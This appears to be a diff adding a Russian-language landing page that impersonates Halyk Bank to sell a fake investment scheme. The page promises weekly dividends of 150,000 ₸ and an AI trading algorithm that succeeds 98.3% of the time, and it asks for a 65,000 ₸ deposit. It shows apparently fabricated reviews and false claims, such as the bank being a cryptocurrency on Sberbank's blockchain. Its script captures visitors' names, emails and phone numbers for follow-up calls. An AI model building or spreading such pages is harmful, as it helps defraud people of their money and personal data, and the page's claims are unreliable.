@@ -1,0 +1,650 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <title>Halyk Bank</title>
+  <meta name="description" content="description">
+  <link rel="stylesheet" href="css/style.min.css">
+  <!-- https://realfavicongenerator.net/ -->
+  <link rel="apple-touch-icon" sizes="72x72" href="img/favicon/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="img/favicon/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="img/favicon/favicon-16x16.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+
+</head>
+
+<body class="page-body">
+  <header class="page-header container">
+    <picture>
+      <source type="image/webp" srcset="img/img/logo.webp">
+      <img width="182" height="64" class="page-header__img" src="img/img/logo.png" alt="Логотип Halyk Bank">
+    </picture>
+    <nav class="main-nav main-nav--closed main-nav--nojs">
+      <ul class="main-nav__list">
+        <li class="main-nav__item main-nav__item--shadow"></li>
+        <li class="main-nav__item"><a href="#bank">Преимущества</a></li>
+        <li class="main-nav__item"><a href="#calculator">Калькулятор</a></li>
+        <li class="main-nav__item"><a href="#about-bank">Halyk Bank</a></li>
+        <li class="main-nav__item"><a href="#license">Лицензия</a></li>
+        <li class="main-nav__item"><a href="#start">Инвестирование</a></li>
+        <li class="main-nav__item"><a href="#review">Отзывы</a></li>
+      </ul>
+      <a class="btn mobile-only" href="#leadform1">Присоединиться к проекту</a>
+      <button class="main-nav__toggle" type="button">
+        <span class="main-nav__open-btn-text visually-hidden">Mеню</span>
+      </button>
+    </nav>
+  </header>
+  <main>
+    <section class="promo">
+      <div class="promo__wrapper">
+        <h1 class="promo__heading heading">Получай дивиденды от <span>150&nbsp;000&nbsp;₸</span> в неделю</h1>
+        <p class="promo__about">Стань одним из первых инвесторов, приобретающих акции самого крупного банка в
+          Казахстане.</p>
+        <form action="#" class="form" method="POST" id="leadform1">
+          <input type="text" name="name" id="name" placeholder="Имя Фамилия">
+          <input type="email" name="email" id="email" placeholder="Эл. адрес">
+          <input type="tel" name="phone1" placeholder="" id="phone1" />
+          <input id="realPhone1" class="hidden-phone" type="hidden" name="phone" value="" />
+          <input type="hidden" name="currency" value="usd">
+          <input id="country1" type="hidden" name="country" value="ru">
+          <input type="hidden" name="comment" class="comment" value="">
+          <input type="hidden" name="campaign_name" value="">
+          <button class="btn submit_btn" type="submit">
+            <span>Отправить заявку</span>
+          </button>
+          <div class="form_message error inactive"
+            style="margin:15px 0;background-color: #ffd4d4;border: 2px dashed #ce0909;border-radius: 10px;padding: 20px;max-width: 350px;">
+          </div>
+        </form>
+      </div>
+
+      <div class="promo__wrapper  promo__wrapper--mw53">
+        <div class="promo__video-bcg">
+          <div class="promo__video">
+            <button type="button" id="button-play">
+              <svg width="38" height="44">
+                <use xlink:href="img/sprite.svg#play"></use>
+              </svg>
+            </button>
+            <div style="padding:56.25% 0 0 0;position:relative;">
+              <iframe
+                src="https://player.vimeo.com/video/833805934?badge=0&amp;autopause=0&amp;player_id=0&amp;app_id=58479&loop=1&"
+                frameborder="0" allow="autoplay; fullscreen; picture-in-picture" allowfullscreen
+                style="position:absolute;top:0;left:0;width:100%;height:100%;" title="Yandex_land">
+              </iframe>
+            </div>
+            <script src="https://player.vimeo.com/api/player.js"></script>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="bank container" id="bank">
+      <p class="bank__about">Halyk банк продолжает свою миссию предоставления широкого спектра финансовых услуг в
+        Казахстане и других странах в соответствии с международными стандартами. Они стремятся обеспечить сохранность,
+        эффективное размещение и увеличение средств клиентов и акционеров во всех сегментах финансового рынка, включая
+        банковское дело, страхование, ценные бумаги и лизинг</p>
+      <ul class="bank__benefits">
+        <li class="bank__item bank__item--person">
+          <p>Надежность и клиентоориентированность</p>
+        </li>
+        <li class="bank__item bank__item--check">
+          <p>Более 99 лет в финансовом секторе</p>
+        </li>
+        <li class="bank__item bank__item--laptop">
+          <p>С вами будуть работать только профессионалы своего дела с многолетним стажем</p>
+        </li>
+        <li class="bank__item bank__item--dollar">
+          <p>Крупнейший банк Казахстана успешно работающий на благо своих клиентов</p>
+        </li>
+      </ul>
+    </section>
+
+    <section class="calculator container" id="calculator">
+      <div class="calculator__wrapper">
+        <h2 class="profit__heading heading heading--small">Калькулятор</h2>
+        <p class="calculator__about">Просчитайте ваш доход всего за пару минут</p>
+      </div>
+
+      <div class="calculator__wrapper">
+        <div class="profit__wrapper">
+          <div class="calculator__range">
+            <div class="profit__sum">
+              <label class="">Сколько хотите заработать?</label>
+              <h3 class="" id="calcResult"></h3>
+            </div>
+            <input type="text" class="js-range-slider" name="my_range" value="150" />
+            <p>Выберите срок инвестирования</p>
+            <input type="text" class="js-range-slider2" name="my_range2" value="150" />
+            <div class="profit__amount">
+              <label class="">Сумма инвестирования</label>
+              <span class="heading" id="profitValue">50000 ₸</span>
+            </div>
+            <a href="#leadform1" class="btn">Отправить заявку</a>
+            <p class="calculator__att">Предварительный расчет. Не является публичной офертой</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="about-bank container" id="about-bank">
+      <h2 class="heading heading--small">Про Halyk банк</h2>
+      <p class="about-bank__about about-bank__about--pr220">Наша разработанная командой технология автотрейдинга
+        позволяет зарабатывать на акциях, индексах. Программа успешно внедрена в 12 лицензированных брокерах СНГ и
+        Европы. Она основана на блокчейне Halyk банка, специально оптимизированном для быстрой торговли. С
+        использованием искусственного интеллекта и анализа котировок опционов на ведущих биржах мира, алгоритм
+        обеспечивает успешные сделки в 98,3% случаев.</p>
+      <ul class="about-bank__infos">
+        <li class="about-bank__item">
+          <picture>
+            <source type="image/webp" srcset="img/img/desk.webp">
+            <img width="545" height="340" class="about-bank__img" src="img/img/desk.jpg" alt="График на планшете">
+          </picture>
+          <div class="about-bank__item-wrapper">
+            <h3 class="about-bank__sub-heading">Информируем, что с 15&nbsp;июня 2023 года по 31&nbsp;июля 2023 года на
+              AIX будет проходить размещение выпуска долларовых дисконтных облигаций АО «Home Credit Bank»</h3>
+            <p class="about-bank__about">AIX (Astana International Exchange) является финансовой биржей, расположенной в
+              Астане, Казахстан. Она предоставляет инвесторам возможность торговать различными финансовыми
+              инструментами, включая акции, облигации и другие ценные бумаги.</p>
+            <a href="#leadform1" class="btn">Купить облигации</a>
+          </div>
+        </li>
+
+        <li class="about-bank__item about-bank__item--reverse">
+          <picture>
+            <source type="image/webp" srcset="img/img/forbes.webp">
+            <img width="545" height="340" class="about-bank__img" src="img/img/forbes.jpg" alt="Forbes">
+          </picture>
+          <div class="about-bank__item-wrapper">
+            <h3 class="about-bank__sub-heading">Журнал “Forbes” (Forbes Global 2000)</h3>
+            <p class="about-bank__about">Halyk банк- второй среди банков СНГ и первый среди казахстанских компаний по
+              объему чистой прибыли</p>
+            <a href="#leadform1" class="btn">Стать частью проекта</a>
+          </div>
+        </li>
+
+        <li class="about-bank__item">
+          <picture>
+            <source type="image/webp" srcset="img/img/ceo.webp">
+            <img width="545" height="340" class="about-bank__img" src="img/img/ceo.jpg"
+              alt="CEO на фоне постера с логотипом банка">
+          </picture>
+          <div class="about-bank__item-wrapper">
+            <h3 class="about-bank__sub-heading">МФО KMF разместила 2-й выпуск облигаций общим объемом 10 млрд тенге</h3>
+            <p class="about-bank__about">16 мая 2023 года Микрофинансовая организация «КMF (КМФ)» (далее – «KMF»)
+              успешно провела первичное размещение второго выпуска облигаций на сумму 10 млрд тенге сроком на 1 год.
+              Финансовое консультирование и андеррайтинг данного размещения было осуществлено АО «Halyk Finance».</p>
+            <a href="#leadform1" class="btn">Купить облигации</a>
+          </div>
+        </li>
+      </ul>
+    </section>
+
+    <section class="license container" id="license">
+      <div class="license__gradient"></div>
+      <div class="license__wrapper">
+        <h2 class="license__heading heading">Лицензия на использование Halyk Bank в&nbsp;биржевой деятельности
+        </h2>
+        <picture>
+          <source type="image/webp" srcset="img/img/license.webp">
+          <img class="license__img" src="img/img/license.jpg" height="389" width="275" alt="Лицензия">
+        </picture>
+
+        <button class="btn" data-open-modal>
+          <svg width="74" height="56">
+            <use xlink:href="img/sprite.svg#arrow"></use>
+          </svg>
+          <span>Развернуть лицензию</span>
+        </button>
+
+        <dialog data-modal class="license__dialog">
+          <div class="license__dialog-wrapper">
+            <picture>
+              <source type="image/webp" srcset="img/img/license.webp">
+              <img class="license__img" src="img/img/license.jpg" height="942" width="666" alt="Лицензия">
+            </picture>
+            <button data-close-modal><span class="main-nav__open-btn-text visually-hidden">Закрыть</span></button>
+          </div>
+        </dialog>
+      </div>
+    </section>
+
+    <section class="start container" id="start">
+      <div class="start__info-wrapper">
+        <h2 class="start__heading heading">Как начать инвестировать вместе с Halyk банк?</h2>
+        <div class="start__info">
+          <div class="start__text-wrapper">
+            <div class="start__about start__about--top start__about--active">
+              <span class="start__step">Шаг 1</span>
+              <p class="start__text">Для начала инвестирования достаточно всего лишь оставить заявку на сайте</p>
+              <span class="start__circle start__circle--top"></span>
+            </div>
+            <div class="start__about start__about--center">
+              <span class="start__step">Шаг 2</span>
+              <p class="start__text">После того, как Вы оставили заявку на сайте с вами свяжется консультант и ответит
+                на все вопросы</p>
+              <span class="start__circle start__circle--middle"></span>
+            </div>
+            <div class="start__about start__about--center">
+              <span class="start__step">Шаг 3</span>
+              <p class="start__text">Сделать минамальный депозит в размере 65 000 ₸</p>
+              <span class="start__circle start__circle--middle"></span>
+            </div>
+            <div class="start__about start__about--end">
+              <span class="start__step">Шаг 4</span>
+              <p class="start__text">Далее, остается лишь ждать выплат от программы</p>
+              <span class="start__circle start__circle--bottom"></span>
+            </div>
+          </div>
+          <picture>
+            <source type="image/webp" srcset="img/img/flagsontable.webp">
+            <img class="start__img" src="img/img/flagsontable.jpg" height="400" width="600" alt="Флажки">
+          </picture>
+        </div>
+      </div>
+
+    </section>
+
+    <section class="review container" id="review">
+      <h2 class="review__heading heading">Отзывы наших клиентов</h2>
+      <p class="review__about">Halyk банк задуман как финансовый актив и нативный расчетный инструмент в блокчейн сети
+        Сбербанка - крупнейшего банка Казахстана. По итогам 2019 года у «Halyk Bank» 96,2 млн активных частных клиентов
+        и 2,6 млн активных корпоративных клиентов, именно в этом году было принято запустить свою криптовалюту.</p>
+      <div class="slider">
+        <div class="review__card slider__item">
+          <div class="review__avatae-wrapper">
+            <picture>
+              <source type="image/webp" srcset="img/avatars/latif.webp">
+              <img width="60" height="60" class="review__img" src="img/avatars/latif.jpg" alt="Пірәліұлы Латиф">
+            </picture>
+            <div class="review__name-wrapper">
+              <cite>Пірәліұлы Латиф</cite>
+              <span class="review__nik">@Butterbean</span>
+            </div>
+          </div>
+          <blockquote class="review__blockquote">Проект помог мне выбраться из финансовой ямы во время карантина
+            и действительно изменил мою жизнь!</blockquote>
+          <p class="review__time">23:02| Май 23,2023</p>
+        </div>
+
+        <div class="review__card slider__item">
+          <div class="review__avatae-wrapper">
+            <picture>
+              <source type="image/webp" srcset="img/avatars/ismetuly.webp">
+              <img width="60" height="60" class="review__img" src="img/avatars/ismetuly.jpg" alt="Ісметұлы Латиф">
+            </picture>
+            <div class="review__name-wrapper">
+              <cite>Ісметұлы Латиф</cite>
+              <span class="review__nik">@Gamethe</span>
+            </div>
+          </div>
+          <blockquote class="review__blockquote">Решил попробовать себя в роли инвестора на проекте. Не имея опыта, я
+            сразу влился в процесс и начал зарабатывать 500 евро </blockquote>
+          <p class="review__time">13:33| Февраль 12,2023</p>
+        </div>
+
+        <div class="review__card slider__item">
+          <div class="review__avatae-wrapper">
+            <picture>
+              <source type="image/webp" srcset="img/avatars/damen.webp">
+              <img width="60" height="60" class="review__img" src="img/avatars/damen.jpg" alt="Ошақбайұлы Дәмен">
+            </picture>
+            <div class="review__name-wrapper">
+              <cite>Ошақбайұлы Дәмен</cite>
+              <span class="review__nik">@Ckyliу453</span>
+            </div>
+          </div>
+          <blockquote class="review__blockquote">Проект — реальная возможность обеспечить себе достойную жизнь.Очень
+            удобно и легко — всем советую.</blockquote>
+          <p class="review__time">18:37| Март 1,2023</p>
+        </div>
+      </div>
+    </section>
+
+    <section class="come-on container">
+      <h2 class="come-on__heading heading">Получай дивиденды от 150 000 ₸ в неделю</h2>
+      <p class="come-on__about">Стань одним из первых инвесторов, приобретающих акции самого крупного банка в Казахстане.</p>
+      <form action="#" class="form form--bottom" method="POST" id="leadform2">
+        <input type="text" name="name" id="name2" placeholder="Имя Фамилия">
+        <input type="email" name="email" id="email2" placeholder="Эл. адрес">
+        <input type="tel" name="phone2" placeholder="" id="phone2" />
+        <input id="realPhone2" class="hidden-phone" type="hidden" name="phone" value="" />
+        <input type="hidden" name="currency" value="usd">
+        <input id="country2" type="hidden" name="country" value="ru">
+        <input type="hidden" name="comment" class="comment" value="">
+        <input type="hidden" name="campaign_name" value="">
+        <button class="btn submit_btn" type="submit">
+          <span>Отправить заявку</span>
+        </button>
+        <div class="form_message error inactive"
+          style="margin:15px 0;background-color: #ffd4d4;border: 2px dashed #ce0909;border-radius: 10px;padding: 20px;max-width: 350px;">
+        </div>
+      </form>
+    </section>
+  </main>
+
+  <footer class="page-footer container">
+    <div class="page-footer__wrapper">
+      <picture>
+        <source type="image/webp" srcset="img/img/logo.webp">
+        <img width="182" height="64" class="page-header__img" src="img/img/logo.png" alt="Логотип Halyk Bank">
+      </picture>
+      <p class="page-footer__year">© 2004 - 2023 Halyk Bank</p>
+      <a href="#leadform1" class="page-footer__polycy">Политика конфиденциальности</a>
+      <a href="#leadform1" class="page-footer__polycy">Правила использования</a>
+    </div>
+    <nav class="page-footer__wrapper">
+      <ul class="main-nav__list">
+        <li class="main-nav__item"><a href="#bank">Преимущества</a></li>
+        <li class="main-nav__item"><a href="#calculator">Калькулятор</a></li>
+        <li class="main-nav__item"><a href="#about-bank">Halyk Bank</a></li>
+        <li class="main-nav__item"><a href="#license">Лицензия</a></li>
+        <li class="main-nav__item"><a href="#start">Инвестирование</a></li>
+        <li class="main-nav__item"><a href="#review">Отзывы</a></li>
+      </ul>
+    </nav>
+  </footer>
+  <script src="js/jquery.min.js"></script>
+  <script src="js/ion.rangeSlider.min.js"></script>
+  <script src="js/slick.min.js"></script>
+  <script src="js/script.js"></script>
+  <script src="js/intlTelInput.min.js"></script>
+  <script src="js/jquery.validate.js"></script>
+  <script src="js/jquery.maskedinput.js"></script>
+
+  <script>
+    //phone
+    //first form
+    var input1 = document.querySelector("#phone1");
+    var phoneInput1 = window.intlTelInput(input1, {
+      separateDialCode: true,
+      utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
+      initialCountry: "auto",
+      excludeCountries: ["UA"],
+      geoIpLookup: function(success, failure) {
+        $.get("https://ipinfo.io", function() {}, "jsonp").always(function(resp) {
+          $("#country1").val(resp.country);
+          $("#country2").val(resp.country);
+          var countryCode =
+            resp && checkCountry(resp.country) ? resp.country : "DE";
+          success(countryCode);
+        });
+      },
+    });
+
+
+    function checkCountry(code) {
+      var arr = ["UA"];
+      return !arr.includes(code);
+    }
+
+    $.validator.addMethod(
+      "validNumber",
+      function(value, element, params) {
+        var obj = params.object;
+        if (obj.isValidNumber()) {
+          var num = obj.getNumber().replace("+", "");
+          $(element)
+            .closest("form")
+            .find(".hidden-phone")
+            .val("+" + num);
+        }
+        return obj.isValidNumber();
+      },
+      "ⓘ Введите правильный номер!"
+    );
+
+    const nameForm1 = document.querySelector("#name");
+    const nameForm2 = document.querySelector("#name2");
+    const emailForm1 = document.querySelector("#email");
+    const emailForm2 = document.querySelector("#email2");
+
+    function removeExtraSpaces(e) {
+      const valueWithoutSpaces = e.target.value.replace(/\s+/g, ' ').replace(/^\s+|\s+$/, '');
+      e.target.value = valueWithoutSpaces
+    }
+    nameForm1.addEventListener("focusout", removeExtraSpaces);
+    nameForm2.addEventListener("focusout", removeExtraSpaces);
+
+    // Form validation
+    $.validator.addMethod(
+      "alphanumeric",
+      function(value, element) {
+        return this.optional(element) || /^[a-zA-Zа-яА-ЯЁё\s]+$/.test(value.replace(/ +/g, ' ').trim()); //RU
+      },
+      "ⓘ Имя может содержать только буквы!"
+    );
+
+    $.validator.addMethod(
+      "nameSurname",
+      function(value, element) {
+        return this.optional(element) || /^[a-zA-Zа-яА-ЯЁё]+(\s+[a-zA-Zа-яА-ЯЁё]+)$/.test(value.replace(/ +/g, ' ').trim()); //RU
+      },
+      "ⓘ Укажите имя и фамилию через пробел"
+    );
+
+    // Email validation
+    $.validator.addMethod("emailValidation", function(value, element) {
+      return this.optional(element) || /^[a-zA-Z0-9_.!#$%&\'*+\-\/=?^_`{|}~]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?){1,61}$/g.test(value);
+    }, "ⓘ Введите правильный адрес");
+
+
+    function removeDotsHyphens(e) {
+      const valueWithoutDotsHyphens = e.target.value.replace(/\.+/g, '.').replace(/-{2,}/g, '--').replace(/^\.|^-*/, '').replace(/\.@/, '@');
+      e.target.value = valueWithoutDotsHyphens;
+    }
+    emailForm1.addEventListener("change", removeDotsHyphens);
+    emailForm2.addEventListener("change", removeDotsHyphens);
+
+    //Trim whitespace on email input
+    $(function() {
+      $('input[type=email]').on('keypress', function(e) {
+        if (e.which == 32)
+          return false;
+      });
+    });
+
+    $("#leadform1").validate({
+      rules: {
+        phone1: {
+          required: true,
+          validNumber: {
+            object: phoneInput1,
+          },
+        },
+        name: {
+          required: true,
+          alphanumeric: true,
+          nameSurname: true,
+        },
+        email: {
+          required: true,
+          email: false,
+          emailValidation: true,
+        }
+      },
+      messages: {
+        phone1: {
+          required: "ⓘ Это поле обязательное",
+        },
+        name: {
+          required: "ⓘ Это поле обязательное",
+        },
+        email: {
+          required: "ⓘ Это поле обязательное"
+        },
+      },
+      submitHandler: function(form, event) {
+        sendAjaxForm(form);
+        return false;
+
+      }
+    });
+
+    function sendAjaxForm(form) {
+      $.ajax({
+        url: $(form).attr('action'),
+        type: "POST",
+        dataType: "json",
+        data: $(form).serialize(),
+        timeout: 30000,
+        beforeSend: function() {
+          $(form).find(".submit_btn ").html('Отправление');
+          $(form).find(".submit_btn").prop('disabled', true);
+        },
+
+      }).done(function(response) {
+        let result = response;
+        let url = result.url;
+        if (response.status === 'ok') {
+          fbq('track', 'Lead');
+          call_gtag();
+          ttq.page();
+          $(form).find(".submit_btn").html('Данные отправлены успешно.');
+          if (response.url) {
+            setTimeout(function() {
+              window.location.href = response.url;
+            }, 1000);
+          } else {
+            $(form).html('<div class="form_message success" style="display: block;margin:15px 0;background-color: #d4ffe0;border: 2px dashed #1f6b34;border-radius: 10px;padding: 20px; color:#0d0c0c">Ваши данные успешно отправлены. Ожидайте звонка от нашего менеджера.</div>');
+          }
+
+        } else {
+          $(form).find('.error.form_message').addClass('active');
+          $(form).find('.error.form_message').html(response.message);
+          $(form).find(".submit_btn ").html('Начать зарабатывать');
+          $(form).find(".submit_btn").prop('disabled', false);
+        }
+
+
+      }).fail(function(response) {
+        $(form).find('.error.form_message').addClass('active');
+        $(form).find('.error.form_message').html('Во время отправки данных произошла ошибка!');
+        $(form).find(".submit_btn ").html('Начать зарабатывать');
+        $(form).find(".submit_btn").prop('disabled', false);
+      });
+    }
+
+    $(window).on("load", function() {
+      setTimeout(function() {
+        const selectedCountryIso1 = phoneInput1.getSelectedCountryData().iso2;
+        if (selectedCountryIso1 === 'at' || selectedCountryIso1 === 'de') {
+          var mask1 = jQuery("#phone1").attr("placeholder").replace(/[0-9]/g, 9) + "?9?9";
+        } else {
+          var mask1 = jQuery("#phone1").attr("placeholder").replace(/[0-9]/g, 9);
+        }
+
+        $(document).ready(function() {
+          jQuery("#phone1").mask(mask1, {
+            autoclear: false
+          });
+        });
+
+        jQuery("#phone1").on("countrychange", function(e, countryData) {
+          jQuery("#phone1").val("");
+          const selectedCountryIso1 = phoneInput1.getSelectedCountryData().iso2;
+          if (selectedCountryIso1 === 'at' || selectedCountryIso1 === 'de') {
+            var mask1 = jQuery("#phone1").attr("placeholder").replace(/[0-9]/g, 9) + "?9?9";
+          } else {
+            var mask1 = jQuery("#phone1").attr("placeholder").replace(/[0-9]/g, 9);
+          }
+          jQuery("#phone1").mask(mask1, {
+            autoclear: false
+          });
+        });
+      }, 1000);
+    });
+
+    //second form
+    var input2 = document.querySelector("#phone2");
+    var phoneInput2 = window.intlTelInput(input2, {
+      separateDialCode: true,
+      utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
+      initialCountry: "auto",
+      excludeCountries: ["UA"],
+      geoIpLookup: function(success, failure) {
+        $.get("https://ipinfo.io", function() {}, "jsonp").always(function(resp) {
+          var countryCode =
+            resp && checkCountry(resp.country) ? resp.country : "DE";
+          success(countryCode);
+        });
+      },
+    });
+
+    $("#leadform2").validate({
+      rules: {
+        phone2: {
+          required: true,
+          validNumber: {
+            object: phoneInput2,
+          },
+        },
+        name: {
+          required: true,
+          alphanumeric: true,
+          nameSurname: true,
+        },
+        email: {
+          required: true,
+          email: false,
+          emailValidation: true,
+        }
+      },
+      messages: {
+        phone2: {
+          required: "ⓘ Это поле обязательное",
+        },
+        name: {
+          required: "ⓘ Это поле обязательное",
+        },
+        email: {
+          required: "ⓘ Это поле обязательное",
+        },
+      },
+      submitHandler: function(form, event) {
+        sendAjaxForm(form);
+        return false;
+
+      },
+    });
+
+    $(window).on("load", function() {
+      setTimeout(function() {
+        const selectedCountryIso2 = phoneInput2.getSelectedCountryData().iso2;
+        if (selectedCountryIso2 === 'at' || selectedCountryIso2 === 'de') {
+          var mask1 = jQuery("#phone2").attr("placeholder").replace(/[0-9]/g, 9) + "?9?9";
+        } else {
+          var mask1 = jQuery("#phone2").attr("placeholder").replace(/[0-9]/g, 9);
+        }
+
+        $(document).ready(function() {
+          jQuery("#phone2").mask(mask1, {
+            autoclear: false
+          });
+        });
+
+        jQuery("#phone2").on("countrychange", function(e, countryData) {
+          jQuery("#phone2").val("");
+          const selectedCountryIso2 = phoneInput2.getSelectedCountryData().iso2;
+          if (selectedCountryIso2 === 'at' || selectedCountryIso2 === 'de') {
+            var mask1 = jQuery("#phone2").attr("placeholder").replace(/[0-9]/g, 9) + "?9?9";
+          } else {
+            var mask1 = jQuery("#phone2").attr("placeholder").replace(/[0-9]/g, 9);
+          }
+          jQuery("#phone2").mask(mask1, {
+            autoclear: false
+          });
+        });
+      }, 1000);
+    });
+
+  </script>
+</body>
+
+</html>
